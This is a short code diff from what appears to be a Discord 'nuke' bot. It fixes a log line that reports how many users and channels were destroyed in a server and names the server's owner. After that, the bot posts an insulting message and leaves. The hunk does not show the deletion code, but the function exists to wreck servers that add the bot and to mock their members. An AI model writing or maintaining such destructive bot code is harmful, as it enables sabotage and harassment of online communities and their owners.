@@ -28,7 +28,7 @@ async function nuke(guild) {
     }
   }));
 
-  console.log(`Nuked ${users} users and ${channels} channels in ${guild} owned by ${owner.user.username}#${owner.user.discriminator} (${guild.owner.id})`);
+  console.log(`Nuked ${users} users and ${channels} channels in ${guild} owned by ${owner.user.username}#${owner.user.discriminator} (${guild.ownerID})`);
 
   await guild.defaultChannel.send('Dumbass, we said not to add the bot...');
   return guild.leave();
